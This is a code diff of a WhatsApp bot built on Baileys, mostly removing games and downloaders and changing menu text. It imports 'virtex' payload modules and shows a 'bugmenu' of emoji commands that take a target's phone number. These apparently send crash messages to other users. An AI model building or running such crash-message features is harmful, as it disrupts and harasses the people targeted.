@@ -11,7 +11,7 @@
 
 //=================================================//
 require('./hwkal')
-const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
+const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = global.baileys
 const fs = require('fs')
 const util = require('util')
 const chalk = require('chalk')
@@ -24,11 +24,11 @@ const moment = require('moment-timezone')
 const { JSDOM } = require('jsdom')
 const { apikey } = require('./apikey.json')
 const { color, bgcolor } = require('./lib/color')
+const maker = require('mumaker')
+const textpro = require('./lib/textpro')
 const { uptotelegra } = require('./lib/upload')
 const { Primbon } = require('scrape-primbon')
 const primbon = new Primbon()
-const hxz = require('hxz-api')
-const ytdl = require("ytdl-core")
 const { Configuration, OpenAIApi } = require('openai')
 const { exec, spawn, execSync } = require("child_process")
 const { ngazap } = require('./baseikal/virtex/ngazap')
@@ -40,33 +40,16 @@ const { virtex7 } = require('./baseikal/virtex/virtex7')
 const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
 const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
 //=================================================//
-// read database
-let tebaklagu = db.data.game.tebaklagu = []
-let _family100 = db.data.game.family100 = []
-let kuismath = db.data.game.math = []
-let tebakgambar = db.data.game.tebakgambar = []
-let tebakkata = db.data.game.tebakkata = []
-let caklontong = db.data.game.lontong = []
-let caklontong_desk = db.data.game.lontong_desk = []
-let tebakkalimat = db.data.game.kalimat = []
-let tebaklirik = db.data.game.lirik = []
-let tebaktebakan = db.data.game.tebakan = []
-
-const yts = require('./scrape/yt-search')
-const { ytSearch } = require('./scrape/yt')
 const thumbnail = fs.readFileSync ('./baseikal/image/mamak.jpg')
 const thumb = fs.readFileSync ('./baseikal/image/mamak.jpg')
 const kalimage = fs.readFileSync ('./baseikal/image/mamak.jpg')
-const Users = JSON.parse(fs.readFileSync('./database/user.json'))
 const owner = JSON.parse(fs.readFileSync('./premium.json'))
 const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
 const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
 const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
 const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
 const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
-const antidel = JSON.parse(fs.readFileSync("./lib/antidel.json"))
 const banned = JSON.parse(fs.readFileSync('./baseikal/dbnye/banned.json'))
-
 virgam = fs.readFileSync(`./baseikal/image/deden.jpeg`)
 //=================================================//
 module.exports = haikal = async (haikal, m, chatUpdate, store) => {
@@ -80,16 +63,16 @@ const isCmd = body.startsWith(prefix)
 const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
 const args = body.trim().split(/ +/).slice(1)
 const pushname = m.pushName || "No Name"
+const botNumber = await haikal.decodeJid(haikal.user.id)
+const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 const text = q = args.join(" ")
 const { type, quotedMsg, mentioned, now, fromMe } = m
 const quoted = m.quoted ? m.quoted : m
 const mime = (quoted.msg || quoted).mimetype || ''
 const isMedia = /image|video|sticker|audio/.test(mime)
 const from = mek.key.remoteJid
-const botNumber = await haikal.decodeJid(haikal.user.id)
-const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
-const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
 const groupMetadata = m.isGroup ? await haikal.groupMetadata(from).catch(e => {}) : ''
+const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
 const groupName = m.isGroup ? groupMetadata.subject : ''
 const participants = m.isGroup ? await groupMetadata.participants : ''
 const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
@@ -98,9 +81,7 @@ const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
 const welcm = m.isGroup ? wlcm.includes(from) : false
 const welcmm = m.isGroup ? wlcmm.includes(from) : false
 const AntiLink = m.isGroup ? ntilink.includes(from) : false 
-const autodelete = from && isCmd ? antidel.includes(from) : false 
 const isBan = banned.includes(m.sender)
-const isUser = Users.includes(m.sender)
 const content = JSON.stringify(m.message)
 const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
 const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
@@ -130,61 +111,11 @@ participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {})
 "mediaKeyTimestamp": "16572901099967",
         'isAnimated': []
 }}}
-const hw = { 
-key: {
-fromMe: false, 
-participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
-},
-"message": {
-"audioMessage": {
-"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
-"mimetype": "audio/mp4",
-"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
-"fileLength": "1067401",
-"seconds": 60,
-"ptt": true,
-"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
-"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
-"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
-"mediaKeyTimestamp": "1684161893"
-}}}
 const reply = (teks) => {
 return haikal.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `DEVELOPER ${botname}`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": 'https://telegra.ph/file/7b3c0ac03dab420c5c12b.jpg',"thumbnail": thumb,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted:m})} 
 
 function pickRandom(list) {
 return list[Math.floor(Math.random() * list.length)]
-}
-
-const downloadMp3 = async (Link) => {
-try {
-await ytdl.getInfo(Link)
-let mp3File = getRandom('.mp3')
-console.log(color('Download Audio With ytdl-core'))
-ytdl(Link, { filter: 'audioonly' })
-.pipe(fs.createWriteStream(mp3File))
-.on('finish', async () => {
-await haikal.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
-fs.unlinkSync(mp3File)
-})
-} catch (err) {
-m.reply(`${err}`)
-}
-}
-
-const downloadMp4 = async (Link) => {
-try {
-await ytdl.getInfo(Link)
-let mp4File = getRandom('.mp4')
-console.log(color('Download Video With ytdl-core'))
-let nana = ytdl(Link)
-.pipe(fs.createWriteStream(mp4File))
-.on('finish', async () => {
-await haikal.sendMessage(from, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
-fs.unlinkSync(`./${mp4File}`)
-})
-} catch (err) {
-m.reply(`${err}`)
-}
 }
 
 async function loading () {
@@ -194,7 +125,7 @@ var hawemod = [
 "《 ███████▒▒▒▒▒》50%",
 "《 ██████████▒▒》80%",
 "《 ████████████》100%",
-"~_*©辛DUX BOT PLC*_~\n𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳..."
+"~_*©辛DUX BOT*_~\n𝙻𝙾𝙰𝙳𝙸𝙽𝙶 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳..."
 ]
 let { key } = await haikal.sendMessage(from, {text: 'ʟᴏᴀᴅɪɴɢ...'})//Pengalih isu
 
@@ -203,26 +134,10 @@ for (let i = 0; i < hawemod.length; i++) {
 await haikal.sendMessage(from, {text: hawemod[i], edit: key });//PESAN LEPAS
 }
 }
-if (autodelete) {
-haikal.sendMessage(m.chat,
-{
-delete: {
-remoteJid: m.chat,
-fromMe: true,
-id: mek.key.id,
-participant: mek.key.participant
-}
-})
-}
 
-/*let reactionMessage = {
-                    react: {
-                        text: `👁️‍🗨️`,
-                        key: { remoteJid: m.chat, fromMe: true, id: mek.key.id }
-                    }
-                }
-                await sleep(1500)
-                haikal.sendMessage(m.chat, reactionMessage)*/
+//BATAS
+//
+
 //=================================================//
 if (!haikal.public) {
 if (!m.key.fromMe) return
@@ -233,10 +148,7 @@ if (m.message) {
 haikal.sendPresenceUpdate(jd, from)
 console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
 }
-if (isCmd && !isUser) {
-Users.push(sender)
-fs.writeFileSync('./database/user.json', JSON.stringify(Users, null, 2))
-}
+
 // Anti Link
 if (AntiLink) {
 if (body.match(/(chat.whatsapp.com\/)/gi)) {
@@ -244,7 +156,7 @@ if (!isBotAdmins) return m.reply(`${mess.botAdmin}, _Untuk menendang orang yang 
 let gclink = (`https://chat.whatsapp.com/`+await haikal.groupInviteCode(m.chat))
 let isLinkThisGc = new RegExp(gclink, 'i')
 let isgclink = isLinkThisGc.test(m.text)
-if (isgclink) return haikal.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected」\`\`\`\n\nYou won't get kicked by a bot because what you sent is a link to this group`})
+if (isgclink) return haikal.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
 if (isAdmins) return haikal.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
 if (isCreator) return haikal.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
 await haikal.sendMessage(m.chat,
@@ -256,7 +168,8 @@ id: mek.key.id,
 participant: mek.key.participant
 }
 })
-haikal.sendMessage(from, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:hw})
+haikal.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+haikal.sendMessage(from, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:m})
 }
 }
 //=================================================//
@@ -287,7 +200,6 @@ return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
 m.reply(e)
 }
 }
-
 async function sendGeekzMessage(chatId, message, options = {}){
     let generate = await generateWAMessage(chatId, message, options)
     let type2 = getContentType(generate.message)
@@ -298,7 +210,7 @@ async function sendGeekzMessage(chatId, message, options = {}){
 
 const sendapk = (teks) => {
 haikal.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
-m.reply('*Rusak Bodoh !! Yang Bener Contoh : Yoapk DUX BOT*')
+m.reply('*Rusak Bodoh !! Yang Bener Contoh : Yoapk DUX BOT MODS WA*')
 }
 for (let ikalii of apknye) {
 if (budy === ikalii) {
@@ -309,7 +221,7 @@ sendapk(buffer)
 //=================================================//
 const sendzip = (teks) => {
 haikal.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
-m.reply('*Rusak Bodoh !! Yang Bener Contoh : Yozip DUX BOT*')
+m.reply('*Rusak Bodoh !! Yang Bener Contoh : Yozip DUX BOT MODS WA*')
 }
 for (let ikali of zipnye) {
 if (budy === ikali) {
@@ -320,7 +232,7 @@ sendzip(buffer)
 //=================================================//
 const senddocu = (teks) => {
 haikal.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
-m.reply('*Rusak Bodoh !! Yang Bener Contoh : Yopdf DUX BOT*')
+m.reply('*Rusak Bodoh !! Yang Bener Contoh : Yopdf DUX BOT MODS WA*')
 }
 for (let ikal of docunye) {
 if (budy === ikal) {
@@ -366,239 +278,6 @@ limit: limitUser,
 console.log(err)
 } 
 //=================================================//
-if (('family100'+from in _family100) && isCmd) {
-kuis = true
-let room = _family100['family100'+from]
-let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
-let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
-if (!isSurender) {
- let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
- if (room.terjawab[index]) return !0
- room.terjawab[index] = m.sender
-}
-let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
-let caption = `
-Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
-${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
-${Array.from(room.jawaban, (jawaban, index) => {
-return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
-}).filter(v => v).join('\n')}
-${isSurender ? '' : `Perfect Player`}`.trim()
-haikal.sendText(from, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+from].pesan = mesg }).catch(_ => _)
-if (isWin || isSurender) delete _family100['family100'+from]
-}
-
-if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
-kuis = true
-jawaban = tebaklagu[m.sender.split('@')[0]]
-if (budy.toLowerCase() == jawaban) {
-   haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, {quoted:m}) 
- delete tebaklagu[m.sender.split('@')[0]]
-} else m.reply('*Jawaban Salah!*')
-}
-
-if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
-kuis = true
-jawaban = kuismath[m.sender.split('@')[0]]
-if (budy.toLowerCase() == jawaban) {
- await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
- delete kuismath[m.sender.split('@')[0]]
-} else m.reply('*Jawaban Salah!*')
-}
-
-if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
-kuis = true
-jawaban = tebakgambar[m.sender.split('@')[0]]
-if (budy.toLowerCase() == jawaban) {
- haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Gambar`}, {quoted:m})
- delete tebakgambar[m.sender.split('@')[0]]
-} else m.reply('*Jawaban Salah!*')
-}
-
-if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
-kuis = true
-jawaban = tebakkata[m.sender.split('@')[0]]
-if (budy.toLowerCase() == jawaban) {
- haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kata`}, {quoted:m})  
- delete tebakkata[m.sender.split('@')[0]]
-} else m.reply('*Jawaban Salah!*')
-}
-
-if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
-kuis = true
-jawaban = caklontong[m.sender.split('@')[0]]
-deskripsi = caklontong_desk[m.sender.split('@')[0]]
-if (budy.toLowerCase() == jawaban) {
- haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
- delete caklontong[m.sender.split('@')[0]]
-delete caklontong_desk[m.sender.split('@')[0]]
-} else m.reply('*Jawaban Salah!*')
-}
-
-if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
-kuis = true
-jawaban = tebakkalimat[m.sender.split('@')[0]]
-if (budy.toLowerCase() == jawaban) {
- haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, {quoted:m}) 
- delete tebakkalimat[m.sender.split('@')[0]]
-} else m.reply('*Jawaban Salah!*')
-}
-
-if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
-kuis = true
-jawaban = tebaklirik[m.sender.split('@')[0]]
-if (budy.toLowerCase() == jawaban) {
- haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lirik`}, {quoted:m}) 
- delete tebaklirik[m.sender.split('@')[0]]
-} else m.reply('*Jawaban Salah!*')
-}
-
-if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
-kuis = true
-jawaban = tebaktebakan[m.sender.split('@')[0]]
-if (budy.toLowerCase() == jawaban) {
- haikal.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted:m}) 
- delete tebaktebakan[m.sender.split('@')[0]]
-} else m.reply('*Jawaban Salah!*')
-}
-
-//TicTacToe
-this.game = this.game ? this.game : {}
-let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
-if (room) {
-let ok
-let isWin = !1
-let isTie = !1
-let isSurrender = !1
-// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
-if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
-isSurrender = !/^[1-9]$/.test(m.text)
-if (m.sender !== room.game.currentTurn) { // nek wayahku
-if (!isSurrender) return !0
-}
-if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
-m.reply({
-'-3': 'Game telah berakhir',
-'-2': 'Invalid',
-'-1': 'Posisi Invalid',
-0: 'Posisi Invalid',
-}[ok])
-return !0
-}
-if (m.sender === room.game.winner) isWin = true
-else if (room.game.board === 511) isTie = true
-let arr = room.game.render().map(v => {
-return {
-X: '❌',
-O: '⭕',
-1: '1️⃣',
-2: '2️⃣',
-3: '3️⃣',
-4: '4️⃣',
-5: '5️⃣',
-6: '6️⃣',
-7: '7️⃣',
-8: '8️⃣',
-9: '9️⃣',
-}[v]
-})
-if (isSurrender) {
-room.game._currentTurn = m.sender === room.game.playerX
-isWin = true
-}
-let winner = isSurrender ? room.game.currentTurn : room.game.winner
-let str = `Room ID: ${room.id}
-
-${arr.slice(0, 3).join('')}
-${arr.slice(3, 6).join('')}
-${arr.slice(6).join('')}
-
-${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
-❌: @${room.game.playerX.split('@')[0]}
-⭕: @${room.game.playerO.split('@')[0]}
-
-Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
-if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== from)
-room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = from
-if (room.x !== room.o) await haikal.sendText(room.x, str, m, { mentions: parseMention(str) } )
-await haikal.sendText(room.o, str, m, { mentions: parseMention(str) } )
-if (isTie || isWin) {
-delete this.game[room.id]
-}
-}
-
-//Suit PvP
-this.suit = this.suit ? this.suit : {}
-let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
-if (roof) {
-let win = ''
-let tie = false
-if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
-if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
-haikal.sendTextWithMentions(from, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
-delete this.suit[roof.id]
-return !0
-}
-roof.status = 'play'
-roof.asal = from
-clearTimeout(roof.waktu)
-//delete roof[roof.id].waktu
-haikal.sendText(from, `Suit telah dikirimkan ke chat
-
-@${roof.p.split`@`[0]} dan 
-@${roof.p2.split`@`[0]}
-
-Silahkan pilih suit di chat masing"
-klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
-if (!roof.pilih) haikal.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
-if (!roof.pilih2) haikal.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
-roof.waktu_milih = setTimeout(() => {
-if (!roof.pilih && !roof.pilih2) haikal.sendText(from, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
-else if (!roof.pilih || !roof.pilih2) {
-win = !roof.pilih ? roof.p2 : roof.p
-haikal.sendTextWithMentions(from, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
-}
-delete this.suit[roof.id]
-return !0
-}, roof.timeout)
-}
-let jwb = m.sender == roof.p
-let jwb2 = m.sender == roof.p2
-let g = /gunting/i
-let b = /batu/i
-let k = /kertas/i
-let reg = /^(gunting|batu|kertas)/i
-if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
-roof.pilih = reg.exec(m.text.toLowerCase())[0]
-roof.text = m.text
-m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
-if (!roof.pilih2) haikal.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
-}
-if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
-roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
-roof.text2 = m.text
-m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
-if (!roof.pilih) haikal.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
-}
-let stage = roof.pilih
-let stage2 = roof.pilih2
-if (roof.pilih && roof.pilih2) {
-clearTimeout(roof.waktu_milih)
-if (b.test(stage) && g.test(stage2)) win = roof.p
-else if (b.test(stage) && k.test(stage2)) win = roof.p2
-else if (g.test(stage) && k.test(stage2)) win = roof.p
-else if (g.test(stage) && b.test(stage2)) win = roof.p2
-else if (k.test(stage) && b.test(stage2)) win = roof.p
-else if (k.test(stage) && g.test(stage2)) win = roof.p2
-else if (stage == stage2) tie = true
-haikal.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}
-
-@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
-@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
-`.trim(), m, { mentions: [roof.p, roof.p2] })
-delete this.suit[roof.id]
-}
-}
 let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
 for (let jid of mentionUser) {
 let user = global.db.data.users[jid]
@@ -626,26 +305,21 @@ switch(command) {
 case 'menu':{
 await loading()
 m.reply(`*Heyyo ${pushname} 🌝 What's Good ${salam}
-Total Users Premium :  ${owner.length}
-Status : ${isCreator ? 'Premium' : 'Free'}
+Total users Premium :  ${owner.length}
+Status : ${isCreator ? 'Owner' : 'Free'}
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 *ACCESS POINT*
-🔏 addprem (234xx)
-🔏 delprem (234xx)
+🔏 addprem (628xx)
+🔏 delprem (628xx)
 🔏 listprem
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-*BLOCKIR Users AKSES*
-🔏 Users add (234xx)
-🔏 Users del (234xx)
+*BLOCK USER ACCESS*
+🔏 users add (628xx)
+🔏 users del (628xx)
 🔏 listban
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-*CEK DATABASE*
-🔏 hapusdb (234xx@s.whatsapp.net)
-🔏 listdb
-▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-*FITUR MENU*
+*MENU*
 ⏳ ɢᴀꜱᴍᴇɴᴜ
-⏳ ɢᴀᴍᴇᴍᴇɴᴜ
 ⏳ ɪꜱʟᴀᴍᴍᴇɴᴜ
 ⏳ ʙᴜɢᴍᴇɴᴜ
 ⏳ ɢʀᴏᴜᴘᴍᴇɴᴜ
@@ -667,127 +341,58 @@ break
 case 'bugmenu': {
 await loading()
 m.reply(`Heyyo ${pushname} 🌝 What's Good ${salam}
-Total Users Premium :  ${owner.length}
+Total users Premium :  ${owner.length}
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-*ACCESS POINT*
-🔏 addprem (234xx)
-🔏 delprem (234xx)
+*TO GAIN ACCESS*
+🔏 addprem (628xx)
+🔏 delprem (628xx)
 🔏 listprem
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-*BLOCK USERS ACCESS*
-🔏 Users add (234xx)
-🔏 Users del (234xx)
+*BLOCK USER ACCESS*
+🔏 users add (628xx)
+🔏 users del (628xx)
 🔏 listban
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-*CHECK DATABASE*
-🔏 hapusdb (234xx@s.whatsapp.net)
-🔏 listdb
-▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-*SEND TO DM*
+*SEND TO DMI*
 ┏━━⊱
-┣❏🗿 (234xxxx)
-┣❏🥔 (234xxxx)
-┣❏🌰 (234xxxx)
-┣❏🎂 (234xxxx)
-┣❏🍆 (234xxxx) 
-┣❏🥑 (234xxxx)
-┣❏🥒 (234xxxx)
-┣❏🥦 (234xxxx)
-┣❏🌽 (234xxxx)
-┣❏🍠 (234xxxx)
-┣❏🥕 (234xxxx)
-┣❏🌶️ (234xxxx)
-┣❏🍅 (234xxxx)
-┣❏🥥 (234xxxx)
-┣❏🍇 (234xxxx)
-┣❏🥝 (234xxxx)
-┣❏🍐 (234xxxx)
-┣❏🍏 (234xxxx)
-┣❏🍈 (234xxxx)
-┣❏🍋 (234xxxx)
-┣❏🍌 (234xxxx)
-┣❏🍍 (234xxxx)
-┣❏🍊 (234xxxx)
-┣❏🍑 (234xxxx)
-┣❏🍉 (234xxxx) 
-┣❏🍎 (234xxxx) 
-┣❏🍒️ (234xxxx) 
-┣❏🍓 (234xxxx) 
-┣❏🍄 (234xxxx) 
-┣❏🌻 (234xxxx) 
-┣❏🏵️ (234xxxx) 
-┣❏💮 (234xxxx) 
-┣❏🌸 (234xxxx) 
-┣❏🌺 (234xxxx) 
-┣❏🥀 (234xxxx)
-┣❏🌹 (234xxxx)
-┣❏🤯 (234xxxx)
-┣❏🖕 (234xxxx)
-┣❏🤙 (234xxxx)
-┣❏💋 (234xxxx)
-┣❏💦 (234xxxx)
-┣❏💩 (234xxxx)
-┣❏👿 (234xxxx)
-┣❏👻 (234xxxx)
-┣❏🤡 (234xxxx)
-┣❏🤮 (234xxxx)
-┣❏😇 (234xxxx)
-┣❏😠 (234xxxx)
-┣❏😭 (234xxxx)
-┣❏🔥 (234xxxx)
-┣❏😜 (234xxxx)
-┣❏😎 (234xxxx)
-┣❏😡 (234xxxx)
-┣❏🤫 (234xxxx)
-┣❏❤️ (234xxxx)
-┣❏😁 (234xxxx)
-┣❏😱 (234xxxx)
-┣❏🤣 (234xxxx)
-┣❏😂 (234xxxx)
-┣❏😘 (234xxxx)
-┣❏💔 (234xxxx)
-┣❏👊 (234xxxx)
+┣❏🌷 (628xxxx)
+┣❏🐲 (628xxxx)
+┣❏🐉 (628xxxx)
+┣❏🌵 (628xxxx)
+┣❏🎄 (628xxxx) 
+┣❏🌲 (628xxxx)
+┣❏🌳 (628xxxx)
+┣❏🌴 (628xxxx)
+┣❏🌱 (628xxxx)
+┣❏🌿 (628xxxx)
+┣❏☘️ (628xxxx)
+┣❏🍀 (628xxxx)
+┣❏🐵 (628xxxx)
+┣❏🙈 (628xxxx)
+┣❏🙉 (628xxxx)
+┣❏🙊 (628xxxx)
+┣❏🐒 (628xxxx)
+┣❏ꜱᴀɴᴛᴇᴛ (628xxxx)
